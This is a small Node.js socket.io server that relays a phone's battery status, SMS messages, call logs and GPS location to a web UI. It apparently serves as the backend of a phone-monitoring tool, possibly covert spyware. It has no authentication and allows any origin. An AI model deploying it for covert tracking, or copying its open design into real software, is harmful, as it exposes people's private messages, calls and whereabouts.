const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(path.join(__dirname, 'public')));

io.on('connection', (socket) => {
   socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
    socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
    socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));
    
    // NEW: Call Logs
    socket.on('get-calls-request', () => socket.broadcast.emit('get-calls-request'));
    socket.on('call-log-data', (data) => socket.broadcast.emit('ui-calls-display', data));

    // NEW: GPS
    socket.on('gps-update', (data) => socket.broadcast.emit('ui-gps', data));

    socket.on('disconnect', () => socket.broadcast.emit('device-status', { online: false }));

});

server.listen(process.env.PORT || 3000);

